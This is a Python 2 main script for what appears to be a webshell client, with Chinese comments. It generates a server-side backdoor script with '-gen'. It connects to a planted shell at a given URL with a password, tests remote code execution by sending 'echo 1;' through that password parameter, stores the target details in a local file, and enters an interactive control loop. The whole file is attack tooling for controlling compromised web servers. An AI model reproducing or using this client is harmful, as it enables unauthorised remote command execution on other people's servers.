#!coding=utf8
import sys
import help.help
from gen import gen
import connnect.con
import control.control




def main():

    #参数帮助选项

    if(len(sys.argv) == 1 or sys.argv[1]=='-help'):
        help.help.conhelp()
        exit(0)

    i=1
    while (i<len(sys.argv)):
        if sys.argv[i]=='-u' :
            i+=3
            continue
        if sys.argv[i] not in help.help.helpEle:
            print '未知参数',sys.argv[i],'，详情参见 -help 选项'
            exit(0)
        i+=2


    #生成服务端

    if(sys.argv[1]=='-gen'):
        gen.gen(sys.argv[2])
        exit(0)

    #进入控制功能

    if(sys.argv[1]=='-u'):
        con = connnect.con.conn()
        con.URL=sys.argv[2]

        #保留服务端信息，方便以后使用
        f = open('./cldog.db', 'w')
        f.write(sys.argv[2])
        f.write('\n')
        f.write(sys.argv[3])
        f.close()

        if con.check(sys.argv[3]+'=echo 1;'):
           print '--><--连接成功,:help查看帮助'
           while 1:
               control.control.control()
        else:
           print '请检查代理设置或者服务器脚本位置或密码是否正确'

if __name__ == '__main__':

    main()

